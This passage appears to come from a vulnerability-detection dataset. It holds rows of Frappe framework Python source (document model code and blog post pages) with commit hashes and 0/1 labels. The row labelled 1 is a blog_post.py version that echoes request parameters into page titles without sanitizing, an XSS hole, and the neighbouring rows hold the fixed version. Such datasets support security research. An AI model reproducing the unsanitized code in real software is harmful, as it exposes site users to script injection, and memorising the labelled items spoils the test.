		if no_nulls:
			for k in list(doc):
				if doc[k] is None:
					del doc[k]

		if no_default_fields:
			for k in list(doc):
				if k in default_fields:
					del doc[k]

		for key in (""_user_tags"", ""__islocal"", ""__onload"", ""_liked_by"", ""__run_link_triggers""):
			if self.get(key):
				doc[key] = self.get(key)

		return doc

	def as_json(self):
		return frappe.as_json(self.as_dict())

	def get_table_field_doctype(self, fieldname):
		return self.meta.get_field(fieldname).options

	def get_parentfield_of_doctype(self, doctype):
		fieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]
		return fieldname[0] if fieldname else None

	def db_insert(self):
		""""""INSERT the document (with valid columns) in the database.""""""
		if not self.name:
			# name will be set by document class in most cases
			set_new_name(self)

		if not self.creation:
			self.creation = self.modified = now()
			self.created_by = self.modifield_by = frappe.session.user

		d = self.get_valid_dict(convert_dates_to_str=True)

		columns = list(d)
		try:
			frappe.db.sql(""""""insert into `tab{doctype}`
				({columns}) values ({values})"""""".format(
					doctype = self.doctype,
					columns = "", "".join([""`""+c+""`"" for c in columns]),
					values = "", "".join([""%s""] * len(columns))
				), list(d.values()))
		except Exception as e:
			if e.args[0]==1062:
				if ""PRIMARY"" in cstr(e.args[1]):
					if self.meta.autoname==""hash"":
						# hash collision? try again
						self.name = None
						self.db_insert()
						return

					raise frappe.DuplicateEntryError(self.doctype, self.name, e)

				elif ""Duplicate"" in cstr(e.args[1]):
					# unique constraint
					self.show_unique_validation_message(e)
				else:
					raise
			else:
				raise
		self.set(""__islocal"", False)

	def db_update(self):
		if self.get(""__islocal"") or not self.name:
			self.db_insert()
			return

		d = self.get_valid_dict(convert_dates_to_str=True)

		# don't update name, as case might've been changed
		name = d['name']
		del d['name']

		columns = list(d)

		try:
			frappe.db.sql(""""""update `tab{doctype}`
				set {values} where name=%s"""""".format(
					doctype = self.doctype,
					values = "", "".join([""`""+c+""`=%s"" for c in columns])
				), list(d.values()) + [name])
		except Exception as e:
			if e.args[0]==1062 and ""Duplicate"" in cstr(e.args[1]):
				self.show_unique_validation_message(e)
			else:
				raise

	def show_unique_validation_message(self, e):
		type, value, traceback = sys.exc_info()
		fieldname, label = str(e).split(""'"")[-2], None

		# unique_first_fieldname_second_fieldname is the constraint name
		# created using frappe.db.add_unique
		if ""unique_"" in fieldname:
			fieldname = fieldname.split(""_"", 1)[1]

		df = self.meta.get_field(fieldname)
		if df:
			label = df.label

		frappe.msgprint(_(""{0} must be unique"".format(label or fieldname)))

		# this is used to preserve traceback
		raise frappe.UniqueValidationError(self.doctype, self.name, e)

	def update_modified(self):
		'''Update modified timestamp'''
		self.set(""modified"", now())
		frappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)

	def _fix_numeric_types(self):
		for df in self.meta.get(""fields""):
			if df.fieldtype == ""Check"":
				self.set(df.fieldname, cint(self.get(df.fieldname)))

			elif self.get(df.fieldname) is not None:
				if df.fieldtype == ""Int"":
					self.set(df.fieldname, cint(self.get(df.fieldname)))

				elif df.fieldtype in (""Float"", ""Currency"", ""Percent""):
					self.set(df.fieldname, flt(self.get(df.fieldname)))

		if self.docstatus is not None:
			self.docstatus = cint(self.docstatus)

	def _get_missing_mandatory_fields(self):
		""""""Get mandatory fields that do not have any values""""""
		def get_msg(df):
			if df.fieldtype == ""Table"":
				return ""{}: {}: {}"".format(_(""Error""), _(""Data missing in table""), _(df.label))

			elif self.parentfield:
				return ""{}: {} {} #{}: {}: {}"".format(_(""Error""), frappe.bold(_(self.doctype)),
					_(""Row""), self.idx, _(""Value missing for""), _(df.label))

			else:
				return _(""Error: Value missing for {0}: {1}"").format(_(df.parent), _(df.label))

		missing = []

		for df in self.meta.get(""fields"", {""reqd"": ('=', 1)}):
			if self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():
				missing.append((df.fieldname, get_msg(df)))

		# check for missing parent and parenttype
		if self.meta.istable:
			for fieldname in (""parent"", ""parenttype""):
				if not self.get(fieldname):
					missing.append((fieldname, get_msg(frappe._dict(label=fieldname))))

		return missing

	def get_invalid_links(self, is_submittable=False):
		'''Returns list of invalid links and also updates fetch values if not set'''
		def get_msg(df, docname):
			if self.parentfield:
				return ""{} #{}: {}: {}"".format(_(""Row""), self.idx, _(df.label), docname)
			else:
				return ""{}: {}"".format(_(df.label), docname)

		invalid_links = []
		cancelled_links = []

		for df in (self.meta.get_link_fields()
				+ self.meta.get(""fields"", {""fieldtype"": ('=', ""Dynamic Link"")})):
			docname = self.get(df.fieldname)

			if docname:
				if df.fieldtype==""Link"":
					doctype = df.options
					if not doctype:
						frappe.throw(_(""Options not set for link field {0}"").format(df.fieldname))
				else:
					doctype = self.get(df.options)
					if not doctype:
						frappe.throw(_(""{0} must be set first"").format(self.meta.get_label(df.options)))

				# MySQL is case insensitive. Preserve case of the original docname in the Link Field.

				# get a map of values ot fetch along with this link query
				# that are mapped as link_fieldname.source_fieldname in Options of
				# Readonly or Data or Text type fields

				fields_to_fetch = [
					_df for _df in self.meta.get_fields_to_fetch(df.fieldname)
					if
						not _df.get('fetch_if_empty')
						or (_df.get('fetch_if_empty') and not self.get(_df.fieldname))
				]

				if not fields_to_fetch:
					# cache a single value type
					values = frappe._dict(name=frappe.db.get_value(doctype, docname,
						'name', cache=True))
				else:
					values_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]
						for _df in fields_to_fetch]

					# don't cache if fetching other values too
					values = frappe.db.get_value(doctype, docname,
						values_to_fetch, as_dict=True)

				if frappe.get_meta(doctype).issingle:
					values.name = doctype

				if values:
					setattr(self, df.fieldname, values.name)

					for _df in fields_to_fetch:
						if self.is_new() or self.docstatus != 1 or _df.allow_on_submit:
							setattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])

					notify_link_count(doctype, docname)

					if not values.name:
						invalid_links.append((df.fieldname, docname, get_msg(df, docname)))

					elif (df.fieldname != ""amended_from""
						and (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable
						and cint(frappe.db.get_value(doctype, docname, ""docstatus""))==2):

						cancelled_links.append((df.fieldname, docname, get_msg(df, docname)))

		return invalid_links, cancelled_links

	def _validate_selects(self):
		if frappe.flags.in_import:
			return

		for df in self.meta.get_select_fields():
			if df.fieldname==""naming_series"" or not (self.get(df.fieldname) and df.options):
				continue

			options = (df.options or """").split(""\n"")

			# if only empty options
			if not filter(None, options):
				continue

			# strip and set
			self.set(df.fieldname, cstr(self.get(df.fieldname)).strip())
			value = self.get(df.fieldname)

			if value not in options and not (frappe.flags.in_test and value.startswith(""_T-"")):
				# show an elaborate message
				prefix = _(""Row #{0}:"").format(self.idx) if self.get(""parentfield"") else """"
				label = _(self.meta.get_label(df.fieldname))
				comma_options = '"", ""'.join(_(each) for each in options)

				frappe.throw(_('{0} {1} cannot be ""{2}"". It should be one of ""{3}""').format(prefix, label,
					value, comma_options))

	def _validate_constants(self):
		if frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:
			return

		constants = [d.fieldname for d in self.meta.get(""fields"", {""set_only_once"": ('=',1)})]
		if constants:
			values = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)

		for fieldname in constants:
			df = self.meta.get_field(fieldname)

			# This conversion to string only when fieldtype is Date
			if df.fieldtype == 'Date' or df.fieldtype == 'Datetime':
				value = str(values.get(fieldname))

			else:
				value  = values.get(fieldname)

			if self.get(fieldname) != value:
				frappe.throw(_(""Value cannot be changed for {0}"").format(self.meta.get_label(fieldname)),
					frappe.CannotChangeConstantError)

	def _validate_length(self):
		if frappe.flags.in_install:
			return

		if self.meta.issingle:
			# single doctype value type is mediumtext
			return

		column_types_to_check_length = ('varchar', 'int', 'bigint')

		for fieldname, value in iteritems(self.get_valid_dict()):
			df = self.meta.get_field(fieldname)

			if not df or df.fieldtype == 'Check':
				# skip standard fields and Check fields
				continue

			column_type = type_map[df.fieldtype][0] or None
			default_column_max_length = type_map[df.fieldtype][1] or None

			if df and df.fieldtype in type_map and column_type in column_types_to_check_length:
				max_length = cint(df.get(""length"")) or cint(default_column_max_length)

				if len(cstr(value)) > max_length:
					if self.parentfield and self.idx:
						reference = _(""{0}, Row {1}"").format(_(self.doctype), self.idx)

					else:
						reference = ""{0} {1}"".format(_(self.doctype), self.name)

					frappe.throw(_(""{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}"")\
						.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))

	def _validate_update_after_submit(self):
		# get the full doc with children
		db_values = frappe.get_doc(self.doctype, self.name).as_dict()

		for key in self.as_dict():
			df = self.meta.get_field(key)
			db_value = db_values.get(key)

			if df and not df.allow_on_submit and (self.get(key) or db_value):
				if df.fieldtype==""Table"":
					# just check if the table size has changed
					# individual fields will be checked in the loop for children
					self_value = len(self.get(key))
					db_value = len(db_value)

				else:
					self_value = self.get_value(key)

				if self_value != db_value:
					frappe.throw(_(""Not allowed to change {0} after submission"").format(df.label),
						frappe.UpdateAfterSubmitError)

	def _sanitize_content(self):
		""""""Sanitize HTML and Email in field values. Used to prevent XSS.

			- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'
		""""""
		if frappe.flags.in_install:
			return

		for fieldname, value in self.get_valid_dict().items():
			if not value or not isinstance(value, string_types):
				continue

			value = frappe.as_unicode(value)

			if (u""<"" not in value and u"">"" not in value):
				# doesn't look like html so no need
				continue

			elif ""<!-- markdown -->"" in value and not (""<script"" in value or ""javascript:"" in value):
				# should be handled separately via the markdown converter function
				continue

			df = self.meta.get_field(fieldname)
			sanitized_value = value

			if df and df.get(""fieldtype"") in (""Data"", ""Code"", ""Small Text"") and df.get(""options"")==""Email"":
				sanitized_value = sanitize_email(value)

			elif df and (df.get(""ignore_xss_filter"")
						or (df.get(""fieldtype"")==""Code"" and df.get(""options"")!=""Email"")
						or df.get(""fieldtype"") in (""Attach"", ""Attach Image"")

						# cancelled and submit but not update after submit should be ignored
						or self.docstatus==2
						or (self.docstatus==1 and not df.get(""allow_on_submit""))):
				continue

			else:
				sanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')

			self.set(fieldname, sanitized_value)

	def _save_passwords(self):
		'''Save password field values in __Auth table'''
		if self.flags.ignore_save_passwords is True:
			return

		for df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):
			if self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue
			new_password = self.get(df.fieldname)
			if new_password and not self.is_dummy_password(new_password):
				# is not a dummy password like '*****'
				set_encrypted_password(self.doctype, self.name, new_password, df.fieldname)

				# set dummy password like '*****'
				self.set(df.fieldname, '*'*len(new_password))

	def get_password(self, fieldname='password', raise_exception=True):
		if self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):
			return self.get(fieldname)

		return get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)

	def is_dummy_password(self, pwd):
		return ''.join(set(pwd))=='*'

	def precision(self, fieldname, parentfield=None):
		""""""Returns float precision for a particular field (or get global default).

		:param fieldname: Fieldname for which precision is required.
		:param parentfield: If fieldname is in child table.""""""
		from frappe.model.meta import get_field_precision

		if parentfield and not isinstance(parentfield, string_types):
			parentfield = parentfield.parentfield

		cache_key = parentfield or ""main""

		if not hasattr(self, ""_precision""):
			self._precision = frappe._dict()

		if cache_key not in self._precision:
			self._precision[cache_key] = frappe._dict()

		if fieldname not in self._precision[cache_key]:
			self._precision[cache_key][fieldname] = None

			doctype = self.meta.get_field(parentfield).options if parentfield else self.doctype
			df = frappe.get_meta(doctype).get_field(fieldname)

			if df.fieldtype in (""Currency"", ""Float"", ""Percent""):
				self._precision[cache_key][fieldname] = get_field_precision(df, self)

		return self._precision[cache_key][fieldname]


	def get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):
		from frappe.utils.formatters import format_value

		df = self.meta.get_field(fieldname)
		if not df and fieldname in default_fields:
			from frappe.model.meta import get_default_df
			df = get_default_df(fieldname)

		val = self.get(fieldname)

		if translated:
			val = _(val)

		if absolute_value and isinstance(val, (int, float)):
			val = abs(self.get(fieldname))

		if not doc:
			doc = getattr(self, ""parent_doc"", None) or self

		return format_value(val, df=df, doc=doc, currency=currency)

	def is_print_hide(self, fieldname, df=None, for_print=True):
		""""""Returns true if fieldname is to be hidden for print.

		Print Hide can be set via the Print Format Builder or in the controller as a list
		of hidden fields. Example

			class MyDoc(Document):
				def __setup__(self):
					self.print_hide = [""field1"", ""field2""]

		:param fieldname: Fieldname to be checked if hidden.
		""""""
		meta_df = self.meta.get_field(fieldname)
		if meta_df and meta_df.get(""__print_hide""):
			return True

		print_hide = 0

		if self.get(fieldname)==0 and not self.meta.istable:
			print_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )

		if not print_hide:
			if df and df.print_hide is not None:
				print_hide = df.print_hide
			elif meta_df:
				print_hide = meta_df.print_hide

		return print_hide

	def in_format_data(self, fieldname):
		""""""Returns True if shown via Print Format::`format_data` property.
			Called from within standard print format.""""""
		doc = getattr(self, ""parent_doc"", self)

		if hasattr(doc, ""format_data_map""):
			return fieldname in doc.format_data_map
		else:
			return True

	def reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):
		""""""If the user does not have permissions at permlevel > 0, then reset the values to original / default""""""
		to_reset = []

		for df in high_permlevel_fields:
			if df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:
				to_reset.append(df)

		if to_reset:
			if self.is_new():
				# if new, set default value
				ref_doc = frappe.new_doc(self.doctype)
			else:
				# get values from old doc
				if self.get('parent_doc'):
					self.parent_doc.get_latest()
					ref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]
				else:
					ref_doc = self.get_latest()

			for df in to_reset:
				self.set(df.fieldname, ref_doc.get(df.fieldname))

	def get_value(self, fieldname):
		df = self.meta.get_field(fieldname)
		val = self.get(fieldname)

		return self.cast(val, df)

	def cast(self, value, df):
		return cast_fieldtype(df.fieldtype, value)

	def _extract_images_from_text_editor(self):
		from frappe.utils.file_manager import extract_images_from_doc
		if self.doctype != ""DocType"":
			for df in self.meta.get(""fields"", {""fieldtype"": ('=', ""Text Editor"")}):
				extract_images_from_doc(self, df.fieldname)

def _filter(data, filters, limit=None):
	""""""pass filters as:
		{""key"": ""val"", ""key"": [""!="", ""val""],
		""key"": [""in"", ""val""], ""key"": [""not in"", ""val""], ""key"": ""^val"",
		""key"" : True (exists), ""key"": False (does not exist) }""""""

	out, _filters = [], {}

	if not data:
		return out

	# setup filters as tuples
	if filters:
		for f in filters:
			fval = filters[f]

			if not isinstance(fval, (tuple, list)):
				if fval is True:
					fval = (""not None"", fval)
				elif fval is False:
					fval = (""None"", fval)
				elif isinstance(fval, string_types) and fval.startswith(""^""):
					fval = (""^"", fval[1:])
				else:
					fval = (""="", fval)

			_filters[f] = fval

	for d in data:
		add = True
		for f, fval in iteritems(_filters):
			if not frappe.compare(getattr(d, f, None), fval[0], fval[1]):
				add = False
				break

		if add:
			out.append(d)
			if limit and (len(out)-1)==limit:
				break

	return out
/n/n/n",1
68,2fa19c25066ed17478d683666895e3266936aee6,"frappe/website/doctype/blog_post/blog_post.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

import frappe
from frappe import _
from frappe.website.website_generator import WebsiteGenerator
from frappe.website.render import clear_cache
from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html
from frappe.website.utils import find_first_image, get_comment_list

class BlogPost(WebsiteGenerator):
	website = frappe._dict(
		order_by = ""published_on desc""
	)

	def make_route(self):
		if not self.route:
			return frappe.db.get_value('Blog Category', self.blog_category,
				'route') + '/' + self.scrub(self.title)

	def get_feed(self):
		return self.title

	def validate(self):
		super(BlogPost, self).validate()

		if not self.blog_intro:
			self.blog_intro = self.content[:140]
			self.blog_intro = strip_html_tags(self.blog_intro)

		if self.blog_intro:
			self.blog_intro = self.blog_intro[:140]

		if self.published and not self.published_on:
			self.published_on = today()

		# update posts
		frappe.db.sql(""""""update tabBlogger set posts=(select count(*) from `tabBlog Post`
			where ifnull(blogger,'')=tabBlogger.name)
			where name=%s"""""", (self.blogger,))

	def on_update(self):
		clear_cache(""writers"")

	def get_context(self, context):
		# this is for double precaution. usually it wont reach this code if not published
		if not cint(self.published):
			raise Exception(""This blog has not been published yet!"")

		# temp fields
		context.full_name = get_fullname(self.owner)
		context.updated = global_date_format(self.published_on)

		if self.blogger:
			context.blogger_info = frappe.get_doc(""Blogger"", self.blogger).as_dict()

		context.description = self.blog_intro or self.content[:140]

		context.metatags = {
			""name"": self.title,
			""description"": context.description,
		}

		if ""<!-- markdown -->"" in context.content:
			context.content = markdown(context.content)

		image = find_first_image(self.content)
		if image:
			context.metatags[""image""] = image

		context.comment_list = get_comment_list(self.doctype, self.name)
		if not context.comment_list:
			context.comment_text = _('No comments yet')
		else:
			if(len(context.comment_list)) == 1:
				context.comment_text = _('1 comment')
			else:
				context.comment_text = _('{0} comments').format(len(context.comment_list))

		context.category = frappe.db.get_value(""Blog Category"",
			context.doc.blog_category, [""title"", ""route""], as_dict=1)
		context.parents = [{""name"": _(""Home""), ""route"":""/""},
			{""name"": ""Blog"", ""route"": ""/blog""},
			{""label"": context.category.title, ""route"":context.category.route}]

def get_list_context(context=None):
	list_context = frappe._dict(
		template = ""templates/includes/blog/blog.html"",
		get_list = get_blog_list,
		hide_filters = True,
		children = get_children(),
		# show_search = True,
		title = _('Blog')
	)

	category = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)
	if category:
		category_title = get_blog_category(category)
		list_context.sub_title = _(""Posts filed under {0}"").format(category_title)
		list_context.title = category_title

	elif frappe.local.form_dict.blogger:
		blogger = frappe.db.get_value(""Blogger"", {""name"": frappe.local.form_dict.blogger}, ""full_name"")
		list_context.sub_title = _(""Posts by {0}"").format(blogger)
		list_context.title = blogger

	elif frappe.local.form_dict.txt:
		list_context.sub_title = _('Filtered by ""{0}""').format(sanitize_html(frappe.local.form_dict.txt))

	if list_context.sub_title:
		list_context.parents = [{""name"": _(""Home""), ""route"": ""/""},
								{""name"": ""Blog"", ""route"": ""/blog""}]
	else:
		list_context.parents = [{""name"": _(""Home""), ""route"": ""/""}]

	list_context.update(frappe.get_doc(""Blog Settings"", ""Blog Settings"").as_dict(no_default_fields=True))
	return list_context

def get_children():
	return frappe.db.sql(""""""select route as name,
		title from `tabBlog Category`
		where published = 1
		and exists (select name from `tabBlog Post`
			where `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)
		order by title asc"""""", as_dict=1)

def clear_blog_cache():
	for blog in frappe.db.sql_list(""""""select route from
		`tabBlog Post` where ifnull(published,0)=1""""""):
		clear_cache(blog)

	clear_cache(""writers"")

def get_blog_category(route):
	return frappe.db.get_value(""Blog Category"", {""name"": route}, ""title"") or route

def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):
	conditions = []
	if filters:
		if filters.blogger:
			conditions.append('t1.blogger=""%s""' % frappe.db.escape(filters.blogger))
		if filters.blog_category:
			conditions.append('t1.blog_category=""%s""' % frappe.db.escape(filters.blog_category))

	if txt:
		conditions.append('(t1.content like ""%{0}%"" or t1.title like ""%{0}%"")'.format(frappe.db.escape(txt)))

	if conditions:
		frappe.local.no_cache = 1

	query = """"""\
		select
			t1.title, t1.name, t1.blog_category, t1.route, t1.published_on,
				t1.published_on as creation,
				t1.content as content,
				ifnull(t1.blog_intro, t1.content) as intro,
				t2.full_name, t2.avatar, t1.blogger,
				(select count(name) from `tabCommunication`
					where
						communication_type='Comment'
						and comment_type='Comment'
						and reference_doctype='Blog Post'
						and reference_name=t1.name) as comments
		from `tabBlog Post` t1, `tabBlogger` t2
		where ifnull(t1.published,0)=1
		and t1.blogger = t2.name
		%(condition)s
		order by published_on desc, name asc
		limit %(start)s, %(page_len)s"""""" % {
			""start"": limit_start, ""page_len"": limit_page_length,
				""condition"": ("" and "" + "" and "".join(conditions)) if conditions else """"
		}

	posts = frappe.db.sql(query, as_dict=1)

	for post in posts:
		post.cover_image = find_first_image(post.content)
		post.published = global_date_format(post.creation)
		post.content = strip_html_tags(post.content[:340])
		if not post.comments:
			post.comment_text = _('No comments yet')
		elif post.comments==1:
			post.comment_text = _('1 comment')
		else:
			post.comment_text = _('{0} comments').format(str(post.comments))

		post.avatar = post.avatar or """"
		post.category = frappe.db.get_value('Blog Category', post.blog_category,
			['route', 'title'], as_dict=True)

		if post.avatar and (not ""http:"" in post.avatar and not ""https:"" in post.avatar) and not post.avatar.startswith(""/""):
			post.avatar = ""/"" + post.avatar

	return posts
/n/n/n",0
69,2fa19c25066ed17478d683666895e3266936aee6,"/frappe/website/doctype/blog_post/blog_post.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

import frappe
from frappe import _
from frappe.website.website_generator import WebsiteGenerator
from frappe.website.render import clear_cache
from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown
from frappe.website.utils import find_first_image, get_comment_list

class BlogPost(WebsiteGenerator):
	website = frappe._dict(
		order_by = ""published_on desc""
	)

	def make_route(self):
		if not self.route:
			return frappe.db.get_value('Blog Category', self.blog_category,
				'route') + '/' + self.scrub(self.title)

	def get_feed(self):
		return self.title

	def validate(self):
		super(BlogPost, self).validate()

		if not self.blog_intro:
			self.blog_intro = self.content[:140]
			self.blog_intro = strip_html_tags(self.blog_intro)

		if self.blog_intro:
			self.blog_intro = self.blog_intro[:140]

		if self.published and not self.published_on:
			self.published_on = today()

		# update posts
		frappe.db.sql(""""""update tabBlogger set posts=(select count(*) from `tabBlog Post`
			where ifnull(blogger,'')=tabBlogger.name)
			where name=%s"""""", (self.blogger,))

	def on_update(self):
		clear_cache(""writers"")

	def get_context(self, context):
		# this is for double precaution. usually it wont reach this code if not published
		if not cint(self.published):
			raise Exception(""This blog has not been published yet!"")

		# temp fields
		context.full_name = get_fullname(self.owner)
		context.updated = global_date_format(self.published_on)

		if self.blogger:
			context.blogger_info = frappe.get_doc(""Blogger"", self.blogger).as_dict()

		context.description = self.blog_intro or self.content[:140]

		context.metatags = {
			""name"": self.title,
			""description"": context.description,
		}

		if ""<!-- markdown -->"" in context.content:
			context.content = markdown(context.content)

		image = find_first_image(self.content)
		if image:
			context.metatags[""image""] = image

		context.comment_list = get_comment_list(self.doctype, self.name)
		if not context.comment_list:
			context.comment_text = _('No comments yet')
		else:
			if(len(context.comment_list)) == 1:
				context.comment_text = _('1 comment')
			else:
				context.comment_text = _('{0} comments').format(len(context.comment_list))

		context.category = frappe.db.get_value(""Blog Category"",
			context.doc.blog_category, [""title"", ""route""], as_dict=1)
		context.parents = [{""name"": _(""Home""), ""route"":""/""},
			{""name"": ""Blog"", ""route"": ""/blog""},
			{""label"": context.category.title, ""route"":context.category.route}]

def get_list_context(context=None):
	list_context = frappe._dict(
		template = ""templates/includes/blog/blog.html"",
		get_list = get_blog_list,
		hide_filters = True,
		children = get_children(),
		# show_search = True,
		title = _('Blog')
	)

	category = frappe.local.form_dict.blog_category or frappe.local.form_dict.category
	if category:
		category_title = get_blog_category(category)
		list_context.sub_title = _(""Posts filed under {0}"").format(category_title)
		list_context.title = category_title

	elif frappe.local.form_dict.blogger:
		blogger = frappe.db.get_value(""Blogger"", {""name"": frappe.local.form_dict.blogger}, ""full_name"")
		list_context.sub_title = _(""Posts by {0}"").format(blogger)
		list_context.title = blogger

	elif frappe.local.form_dict.txt:
		list_context.sub_title = _('Filtered by ""{0}""').format(frappe.local.form_dict.txt)

	if list_context.sub_title:
		list_context.parents = [{""name"": _(""Home""), ""route"": ""/""},
								{""name"": ""Blog"", ""route"": ""/blog""}]
	else:
		list_context.parents = [{""name"": _(""Home""), ""route"": ""/""}]

	list_context.update(frappe.get_doc(""Blog Settings"", ""Blog Settings"").as_dict(no_default_fields=True))
	return list_context

def get_children():
	return frappe.db.sql(""""""select route as name,
		title from `tabBlog Category`
		where published = 1
		and exists (select name from `tabBlog Post`
			where `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)
		order by title asc"""""", as_dict=1)

def clear_blog_cache():
	for blog in frappe.db.sql_list(""""""select route from
		`tabBlog Post` where ifnull(published,0)=1""""""):
		clear_cache(blog)

	clear_cache(""writers"")

def get_blog_category(route):
	return frappe.db.get_value(""Blog Category"", {""name"": route}, ""title"") or route

def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):
	conditions = []
	if filters:
		if filters.blogger:
			conditions.append('t1.blogger=""%s""' % frappe.db.escape(filters.blogger))
		if filters.blog_category:
			conditions.append('t1.blog_category=""%s""' % frappe.db.escape(filters.blog_category))

	if txt:
		conditions.append('(t1.content like ""%{0}%"" or t1.title like ""%{0}%"")'.format(frappe.db.escape(txt)))

	if conditions:
		frappe.local.no_cache = 1

	query = """"""\
		select
			t1.title, t1.name, t1.blog_category, t1.route, t1.published_on,
				t1.published_on as creation,
				t1.content as content,
				ifnull(t1.blog_intro, t1.content) as intro,
				t2.full_name, t2.avatar, t1.blogger,
				(select count(name) from `tabCommunication`
					where
						communication_type='Comment'
						and comment_type='Comment'
						and reference_doctype='Blog Post'
						and reference_name=t1.name) as comments
		from `tabBlog Post` t1, `tabBlogger` t2
		where ifnull(t1.published,0)=1
		and t1.blogger = t2.name
		%(condition)s
		order by published_on desc, name asc
		limit %(start)s, %(page_len)s"""""" % {
			""start"": limit_start, ""page_len"": limit_page_length,
				""condition"": ("" and "" + "" and "".join(conditions)) if conditions else """"
		}

	posts = frappe.db.sql(query, as_dict=1)

	for post in posts:
		post.cover_image = find_first_image(post.content)
		post.published = global_date_format(post.creation)
		post.content = strip_html_tags(post.content[:340])
		if not post.comments:
			post.comment_text = _('No comments yet')
		elif post.comments==1:
			post.comment_text = _('1 comment')
		else:
			post.comment_text = _('{0} comments').format(str(post.comments))

		post.avatar = post.avatar or """"
		post.category = frappe.db.get_value('Blog Category', post.blog_category,
			['route', 'title'], as_dict=True)

		if post.avatar and (not ""http:"" in post.avatar and not ""https:"" in post.avatar) and not post.avatar.startswith(""/""):
			post.avatar = ""/"" + post.avatar

	return posts
/n/n/n",1
70,2fa19c25066ed17478d683666895e3266936aee6,"frappe/website/doctype/blog_post/blog_post.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

import frappe
from frappe import _
from frappe.website.website_generator import WebsiteGenerator
from frappe.website.render import clear_cache
from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html
from frappe.website.utils import find_first_image, get_comment_list

class BlogPost(WebsiteGenerator):
	website = frappe._dict(
		order_by = ""published_on desc""
	)

	def make_route(self):
		if not self.route:
			return frappe.db.get_value('Blog Category', self.blog_category,
				'route') + '/' + self.scrub(self.title)

	def get_feed(self):
		return self.title

	def validate(self):
		super(BlogPost, self).validate()

		if not self.blog_intro:
			self.blog_intro = self.content[:140]
			self.blog_intro = strip_html_tags(self.blog_intro)

		if self.blog_intro:
			self.blog_intro = self.blog_intro[:140]

		if self.published and not self.published_on:
			self.published_on = today()

		# update posts
		frappe.db.sql(""""""update tabBlogger set posts=(select count(*) from `tabBlog Post`
			where ifnull(blogger,'')=tabBlogger.name)
			where name=%s"""""", (self.blogger,))

	def on_update(self):
		clear_cache(""writers"")

	def get_context(self, context):
		# this is for double precaution. usually it wont reach this code if not published
		if not cint(self.published):
			raise Exception(""This blog has not been published yet!"")

		# temp fields
		context.full_name = get_fullname(self.owner)
		context.updated = global_date_format(self.published_on)

		if self.blogger:
			context.blogger_info = frappe.get_doc(""Blogger"", self.blogger).as_dict()

		context.description = self.blog_intro or self.content[:140]

		context.metatags = {
			""name"": self.title,
			""description"": context.description,
		}

		if ""<!-- markdown -->"" in context.content:
			context.content = markdown(context.content)

		image = find_first_image(self.content)
		if image:
			context.metatags[""image""] = image

		context.comment_list = get_comment_list(self.doctype, self.name)
		if not context.comment_list:
			context.comment_text = _('No comments yet')
		else:
			if(len(context.comment_list)) == 1:
				context.comment_text = _('1 comment')
			else:
				context.comment_text = _('{0} comments').format(len(context.comment_list))

		context.category = frappe.db.get_value(""Blog Category"",
			context.doc.blog_category, [""title"", ""route""], as_dict=1)
		context.parents = [{""name"": _(""Home""), ""route"":""/""},
			{""name"": ""Blog"", ""route"": ""/blog""},
			{""label"": context.category.title, ""route"":context.category.route}]

def get_list_context(context=None):
	list_context = frappe._dict(
		template = ""templates/includes/blog/blog.html"",
		get_list = get_blog_list,
		hide_filters = True,
		children = get_children(),
		# show_search = True,
		title = _('Blog')
	)

	category = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)
	if category:
		category_title = get_blog_category(category)
		list_context.sub_title = _(""Posts filed under {0}"").format(category_title)
		list_context.title = category_title

	elif frappe.local.form_dict.blogger:
		blogger = frappe.db.get_value(""Blogger"", {""name"": frappe.local.form_dict.blogger}, ""full_name"")
		list_context.sub_title = _(""Posts by {0}"").format(blogger)
		list_context.title = blogger

	elif frappe.local.form_dict.txt:
		list_context.sub_title = _('Filtered by ""{0}""').format(sanitize_html(frappe.local.form_dict.txt))

	if list_context.sub_title:
		list_context.parents = [{""name"": _(""Home""), ""route"": ""/""},
								{""name"": ""Blog"", ""route"": ""/blog""}]
	else:
		list_context.parents = [{""name"": _(""Home""), ""route"": ""/""}]

	list_context.update(frappe.get_doc(""Blog Settings"", ""Blog Settings"").as_dict(no_default_fields=True))
	return list_context

def get_children():
	return frappe.db.sql(""""""select route as name,
		title from `tabBlog Category`
		where published = 1
		and exists (select name from `tabBlog Post`
